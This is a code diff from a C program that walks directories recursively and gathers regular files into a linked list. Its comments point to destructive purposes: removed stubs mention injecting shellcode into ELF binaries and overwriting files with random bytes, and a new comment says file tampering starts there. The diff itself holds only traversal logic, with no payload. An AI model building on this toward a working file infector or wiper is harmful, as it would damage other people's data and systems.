@@ -46,25 +46,19 @@ void DirEntriesParse(char *location)
     {
 
 		// get filetype of this particular directory entry
-		const char *filetype = GetFileType(location, dp->d_name);			
+		const char *filetype = GetFileType( GetAbsPath(location, dp->d_name) );			
 
 
-		// If entry is a "Regular file"
+		// If entry is a "Regular file", store it in a linked list
 		if ( strncmp(filetype, "Regular file", 12) == 0 )
 		{
 			++file_count;
 			char *filename = GetAbsPath(location, dp->d_name);
-/*		
-			if ( IsELF(filename) )
-			{
-				// inject shellcode
-			}
 
-			else
-			{
-				// Write random bytes in file
-			}
-*/		}
+			// Create and add the filename node to 'Files' linked list
+			// Actual file tampering starts from here
+			FileCreateNode(filename);
+		}
 
 
 		// If entry is a "Directory" parse again
@@ -82,17 +76,13 @@ void DirEntriesParse(char *location)
             // keep track of how many directories have been parsed
             ++dir_count;
 
-			
+		
+			// Reccursively parse this directory location	
 			char *dirpath = GetAbsPath(location, dp->d_name);
-			fprintf(stdout, BOLDGREEN"[+]"RESET" Entering"BLUE" %s ...\n"RESET, dirpath);
 			DirEntriesParse( dirpath );
 		}
 	}
 
-
-
-	fprintf(stdout, GREEN"[+]"RESET" Parsed %ld directories\n", dir_count);
-	fprintf(stdout, GREEN"[+]"RESET" Parsed %ld files\n", file_count);
 
 	// Prevent resource leak
     closedir(dirptr);
